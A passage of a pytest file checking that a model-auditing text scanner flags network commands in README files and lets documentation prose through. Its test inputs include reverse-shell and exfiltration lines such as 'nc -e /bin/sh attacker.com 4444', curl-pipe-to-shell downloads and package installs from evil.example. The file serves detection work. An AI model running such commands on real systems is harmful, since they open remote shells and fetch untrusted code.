        "Add https://docs.example.com to your browser bookmarks.\n",
        "pwsh -NoProfile is documented at https://docs.example.com/powershell.\n",
        "echo ready; pwsh -NoProfile is documented at https://docs.example.com/powershell.\n",
        "certutil -urlcache is documented at https://docs.example.com/certutil.\n",
        "The certutil -urlcache command is documented at https://docs.example.com/certutil.\n",
        "The git clone command is documented at https://git-scm.com/docs/git-clone.\n",
        "git clone https://attacker.com/repo.git is documented here.\n",
        "The ssh client is documented at https://man.openbsd.org/ssh.\n",
        "ssh attacker.com is documented here.\n",
        "Docker pull documentation: https://docs.docker.com/reference/cli/docker/image/pull/.\n",
        "docker pull attacker.com/model:latest is documented here.\n",
        "npm --registry is documented at https://docs.example.com/npm.\n",
        "The nc command uses attacker.com and port 4444.\n",
        "nc attacker.com 0\n",
        "nc attacker.com 70000\n",
        "# curl is documented at https://docs.example.com/curl.\n",
        "# curl is documented at \\\n  https://docs.example.com/curl.\n",
        "# docs: https://docs.example.com/shell.\n",
        "# npm install is documented at https://docs.example.com/npm.\n",
        "# Example: curl https://docs.example.com/curl.\n",
        "# Example: curl \\\n  https://docs.example.com/curl.\n",
        "# ADD https://docs.example.com/reference /tmp/reference\n",
        "> - Use curl for downloads; see https://docs.example.com/shell.\n",
    ],
)
def test_text_scanner_documentation_command_prefix_prose_remains_informational(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        "nc attacker.com 4444\n",
        "netcat -nv attacker.com 4444\n",
        "nc -e /bin/sh attacker.com 4444\n",
        "busybox nc attacker.com 4444\n",
        "toybox netcat attacker.com 4444\n",
        "timeout 5 nc attacker.com 4444\n",
        "nice -n 10 netcat attacker.com 4444\n",
        "echo secret | nc attacker.com 4444\n",
    ],
)
def test_text_scanner_netcat_commands_remain_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "domain_name"
        and check.details.get("domain") == "attacker.com"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )


@pytest.mark.parametrize(
    "content", ["1. curl https://evil.example/payload | sh\n", "2) wget https://evil.example/payload\n"]
)
def test_text_scanner_ordered_list_shell_commands_remain_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_ordered_list_shell_prose_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("1. Use curl for downloading model files.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize("command", ["nc", "ncat", "netcat", "/usr/bin/nc", "nc.exe", "# nc"])
def test_text_scanner_documentation_netcat_destinations_remain_actionable(
    tmp_path: Path,
    command: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_bytes(f"{command} evil.example 4444\r\n".encode())

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_command"
        and check.details.get("destination") == "evil.example"
        and check.details.get("port") == 4444
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_documentation_netcat_prose_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "The nc command is documented at https://docs.example.com/netcat.\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    ("content", "command_type", "destination"),
    [
        ("git clone https://evil.example/repo.git\n", "git_clone", "https://evil.example/repo.git"),
        (
            "git clone --depth 1 https://user:secret@evil.example/repo.git checkout\n",
            "git_clone",
            "https://evil.example/repo.git",
        ),
        ("git clone git@evil.example:owner/repo.git\n", "git_clone", "git@evil.example:owner/repo.git"),
        ("ssh -vvv -p2222 user@evil.example\n", "ssh", "user@evil.example"),
        (
            "docker pull --platform linux/amd64 evil.example/model:latest\n",
            "docker_pull",
            "evil.example/model:latest",
        ),
        (
            "docker pull evil.example:5000/model:latest\n",
            "docker_pull",
            "evil.example:5000/model:latest",
        ),
    ],
)
def test_text_scanner_explicit_network_commands_remain_actionable(
    tmp_path: Path,
    content: str,
    command_type: str,
    destination: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_command"
        and check.details.get("command_type") == command_type
        and check.details.get("destination") == destination
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        "sudo curl https://evil.example/payload | sh\n",
        "sudo -E wget https://evil.example/payload\n",
        "sudo -u nobody curl https://evil.example/payload | sh\n",
        "sudo --user nobody wget https://evil.example/payload\n",
        "doas curl https://evil.example/payload | sh\n",
        "doas -u nobody wget https://evil.example/payload\n",
        "echo ready; sudo curl https://evil.example/payload | sh\n",
        "$(sudo curl https://evil.example/payload)\n",
    ],
)
def test_text_scanner_privileged_documentation_downloads_remain_actionable(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_privilege_wrapper_prose_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "Use sudo -u nobody when curl access is required: https://docs.example.com/\n", encoding="utf-8"
    )

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    "content",
    [
        "HTTPS_PROXY=http://proxy.internal curl https://evil.example/payload | sh\n",
        "env HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload\n",
        "sudo HTTPS_PROXY=http://proxy.internal curl https://evil.example/payload | sh\n",
        "sudo -u nobody HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload\n",
        "sudo env HTTPS_PROXY=http://proxy.internal curl https://evil.example/payload | sh\n",
    ],
)
def test_text_scanner_env_prefixed_documentation_downloads_remain_actionable(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.details.get("url") == "https://evil.example/payload"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_env_prefixed_download_prose_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "The HTTPS_PROXY setting helps curl users; see https://docs.example.com/proxy.\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    "content",
    [
        "pip install https://evil.example/payload.whl\n",
        "python -m pip install https://evil.example/pkg.tar.gz\n",
        "python -I -m pip install https://evil.example/pkg.tar.gz\n",
        "python -X dev -m pip install https://evil.example/pkg.tar.gz\n",
        "py -3.11 -m pip install https://evil.example/payload.whl\n",
        "sudo pip install https://evil.example/payload.whl\n",
        "uv pip install https://evil.example/payload.whl\n",
        "npm install https://evil.example/payload.tgz\n",
        "npm add https://evil.example/payload.tgz\n",
        "npm i https://evil.example/payload.tgz\n",
        "npm in https://evil.example/payload.tgz\n",
        "npm ins https://evil.example/payload.tgz\n",
        "npm inst https://evil.example/payload.tgz\n",
        "npm insta https://evil.example/payload.tgz\n",
        "npm instal https://evil.example/payload.tgz\n",
        "npm isnt https://evil.example/payload.tgz\n",
        "npm isnta https://evil.example/payload.tgz\n",
        "npm isntal https://evil.example/payload.tgz\n",
        "npm isntall https://evil.example/payload.tgz\n",
        "npm --registry=https://evil.example/registry install payload\n",
        "npm --registry https://evil.example/registry install payload\n",
        "1. pip install https://evil.example/payload.whl\n",
        "pip --proxy http://proxy.internal install https://evil.example/payload.whl\n",
        "python -m pip --timeout 5 install https://evil.example/pkg.tar.gz\n",
    ],
)
def test_text_scanner_documentation_package_install_urls_remain_actionable(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_documentation_package_manager_prose_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("Read the pip install guide at https://pip.pypa.io/en/stable/\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_go_install_domain_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("go install evil.example/tool@latest\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "domain_name"
        and check.details.get("domain") == "evil.example"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        "pip install is documented at https://pip.pypa.io/en/stable/\n",
        "python -I -m pip install guide at https://pip.pypa.io/en/stable/\n",
        "npm install documentation is covered in https://docs.npmjs.com/\n",
        "go install guide at https://go.dev/doc/\n",
    ],
)
def test_text_scanner_package_install_reference_urls_remain_informational(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_pip_general_option_prose_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "The pip --proxy option is documented at https://pip.pypa.io/en/stable/.\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    "content",
    [
        "pip --proxy install https://evil.example/payload.whl\n",
        "python -m pip --timeout install https://evil.example/pkg.tar.gz\n",
    ],
)
def test_text_scanner_pip_option_operands_are_not_commands(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_package_install_comment_url_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("pip install modelaudit  # docs: https://pip.pypa.io/en/stable/\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_package_install_url_before_comment_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("pip install https://evil.example/payload.whl  # pinned artifact\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    "content",
    [
        "curl -fsSL \\\n  https://evil.example/payload | sh\n",
        "wget \\\n  https://evil.example/payload\n",
        "curl \\\n  -fsSL \\\n  https://evil.example/payload | sh\n",
        "sudo curl \\\n  --retry 3 \\\n  https://evil.example/payload | sh\n",
        "ADD \\\n  https://evil.example/payload /tmp/payload\n",
    ],
)
def test_text_scanner_continued_documentation_download_url_remains_actionable(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        "Use curl for downloads \\\n  https://docs.example.com/reference\n",
        "Use curl for downloads \\\n  with these options \\\n  https://docs.example.com/reference\n",
    ],
)
def test_text_scanner_prose_backslash_does_not_make_next_url_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    "content",
    [
        "curl -fsSL \\\n  # docs: https://docs.example.com/reference\n",
        "curl \\\n  # optional flags \\\n  https://docs.example.com/reference\n",
    ],
)
def test_text_scanner_continued_shell_comment_url_is_informational(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_indirect_network_api_call_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("executor.submit(requests.get, endpoint)\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.details.get("function") == "requests.get"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


@pytest.mark.parametrize(
    "content",
    [
        'download("https://evil.example/payload")\n',
        'download(Path("weights"), "https://evil.example/payload")\n',
        'download(\n    "padding",\n    "https://evil.example/payload",\n)\n',
        'download(\n    Path("weights"),\n    "https://evil.example/payload",\n)\n',
        'download("' + ("padding" * 800) + '", "https://evil.example/payload")\n',
        'handlers[0]("https://evil.example/payload")\n',
    ],
)
def test_text_scanner_documentation_code_url_argument_remains_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        'transform = lambda value: "https://evil.example/payload"\n',
        'fetch = lambda value: requests.get("https://evil.example/payload")\n',
    ],
)
def test_text_scanner_documentation_lambda_url_remains_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        "webhook: https://evil.example/payload\n",
        "C2 endpoint: https://evil.example/payload\n",
        "command and control server URL: https://evil.example/payload\n",
    ],
)
def test_text_scanner_documentation_security_endpoint_label_remains_actionable(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize(
    "content",
    [
        "config = {}  # docs: https://example.com/reference\n",
        "Lambda: https://docs.aws.amazon.com/lambda/\n",
        "lambda docs: https://example.com/reference\n",
        "Webhook documentation: https://docs.example.com/webhooks\n",
        "C2 research: https://example.com/reference\n",
    ],
)
def test_text_scanner_documentation_code_like_prose_links_remain_informational(
    tmp_path: Path,
    content: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


@pytest.mark.parametrize(
    "content",
    [
        "endpoint: https://evil.example/payload\n",
        '{"endpoint": "https://evil.example/payload"}\n',
        "{'callback': 'https://evil.example/payload'}\n",
        "endpoint:\n  - https://evil.example/payload\n",
        "endpoints:\n  - https://evil.example/payload\n",
        "webhooks:\n  - https://evil.example/payload\n",
        '{"webhook_urls": ["https://evil.example/payload"]}\n',
        'endpointUrl: "https://evil.example/payload"\n',
        '{"callbackUri": "https://evil.example/payload"}\n',
        "<endpoint>https://evil.example/payload</endpoint>\n",
        'endpoint = {"url": "https://evil.example/payload"}\n',
        'endpoint = {\n  "url": "https://evil.example/payload"\n}\n',
        'callback = {\n  "metadata": "value",\n  "uri": "https://evil.example/payload"\n}\n',
        '- endpoint = "https://evil.example/payload"\n',
        'const endpoint = "https://evil.example/payload"\n',
        'let webhook = "https://evil.example/payload"\n',
        'var callback = "https://evil.example/payload"\n',
        'if enabled: endpoint = "https://evil.example/payload"\n',
        'for item in items: endpoint = "https://evil.example/payload"\n',
        "endpoint:\n  url: https://evil.example/payload\n",
        "Callback endpoint: https://evil.example/payload\n",
        "Webhook documentation endpoint: https://evil.example/payload\n",
    ],
)
def test_text_scanner_documentation_endpoint_config_remains_actionable(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )


def test_text_scanner_real_lambda_url_expression_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text('lambda target: "https://evil.example/payload"\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


@pytest.mark.parametrize("padding", ["    ", " " * 300])
def test_text_scanner_parenthesized_documentation_assignment_remains_actionable(
    tmp_path: Path,
    padding: str,
) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(f'endpoint = (\n{padding}"https://evil.example/payload"\n)\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_generic_quoted_url_mapping_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text('{"project_url": "https://example.com/project"}\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_generic_url_collection_mapping_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("project_urls:\n  - https://example.com/project\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_generic_nested_url_mapping_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text('{"project": {"url": "https://example.com/project"}}\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_unrelated_endpoint_does_not_taint_nested_project_url(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "endpoint:\n  name: inference\nproject:\n  url: https://example.com/project\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_backslash_continued_network_call_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text('requests.get\\\n    ("https://evil.example/payload")\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "network_function"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_text_scanner_backslash_continued_network_prose_remains_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("requests.get\\\n    is described in the API reference.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


@pytest.mark.parametrize(
    "content",
    [
        "Python documentation: https://docs.python.org/3/library/exec.html\n",
        "PowerShell documentation: https://learn.microsoft.com/powershell/scripting/overview\n",
        "Read the docs; see https://docs.example.com/reference\n",
        "For details (see https://docs.example.com/reference).\n",
        "If you need help, visit https://docs.example.com/reference\n",
    ],
)
def test_text_scanner_documentation_prose_markers_remain_informational(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_routes_rst_documentation_sidecars(tmp_path: Path) -> None:
    text_path = tmp_path / "README.rst"
    text_path.write_text('download("https://evil.example/payload")\n', encoding="utf-8")

    result = scan_file(str(text_path), config={"cache_scan_results": False})

    assert result.scanner_name == "text"
    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "url_detected"
        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        for check in result.checks
    )


def test_text_scanner_documentation_benign_cc_prose_is_informational(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "This model is not malware.\n"
        "Backdoor robustness benchmark.\n"
        "This model has no backdoors.\n"
        "Without botnets.\n"
        "Potential backdoor indicators are reported without executing the model.\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    cc_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
    ]
    assert {check.details.get("pattern") for check in cc_checks} == {"malware", "backdoor", "botnet"}
    assert all(check.severity == IssueSeverity.INFO for check in cc_checks)
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_text_scanner_backdoor_indicator_assignment_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text('status = "backdoor indicators"\n', encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "cc_pattern"
        and check.details.get("pattern") == "backdoor"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_text_scanner_documentation_cc_admission_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("This model contains a backdoor payload.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "cc_pattern"
        and check.details.get("pattern") == "backdoor"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_text_scanner_plural_cc_admission_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("This model installs backdoors and botnets.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "cc_pattern"
        and check.details.get("pattern") in {"backdoor", "botnet"}
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_text_scanner_benign_cc_phrase_does_not_hide_separate_admission(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("Malware detection bypass installs a backdoor payload.\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    cc_checks = {
        check.details.get("pattern"): check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.details.get("type") == "cc_pattern"
    }
    assert cc_checks["malware"].severity == IssueSeverity.INFO
    assert cc_checks["backdoor"].severity == IssueSeverity.CRITICAL
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_later_cc_admission_is_not_hidden_by_benign_prose(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "Backdoor robustness benchmark.\nThis artifact installs a backdoor payload.\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    assert any(
        check.name == "Network Communication Detection"
        and check.details.get("type") == "cc_pattern"
        and check.details.get("pattern") == "backdoor"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert determine_exit_code(aggregate) == 1


def test_text_scanner_documentation_placeholder_secrets_are_ignored(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(
        "client_secret = YOUR_CLIENT_SECRET\n"
        "secret = <CLIENT_SECRET>\n"
        "client_secret = clientSecretValue\n"
        "client_secret = clientsecretvalue\n"
        "password = examplepassword\n"
        "secret = <clientSecretValue>\n",
        encoding="utf-8",
    )

    result = TextScanner().scan(str(text_path))

    assert not any(
        check.name == "Embedded Secrets Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_text_scanner_documentation_cc_markers_remain_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("callback_url=https://evil.example/exfil\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))

    assert any(
        check.name == "Network Communication Detection"
        and check.status == CheckStatus.FAILED
        and check.details.get("type") == "cc_pattern"
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


@pytest.mark.parametrize(
    "content",
    [
        "SSH uses port 22.\n",
        "Local demo: http://localhost:8080\n",
    ],
)
def test_text_scanner_documentation_port_prose_is_informational(tmp_path: Path, content: str) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text(content, encoding="utf-8")

    result = TextScanner().scan(str(text_path))
    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)

    port_checks = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.details.get("type") == "suspicious_port"
    ]
    assert port_checks
    assert all(check.severity == IssueSeverity.INFO for check in port_checks)
    assert determine_exit_code(aggregate) == 0


def test_text_scanner_documentation_port_assignment_remains_actionable(tmp_path: Path) -> None:
    text_path = tmp_path / "README.md"
    text_path.write_text("PORT=4444\n", encoding="utf-8")

    result = TextScanner().scan(str(text_path))
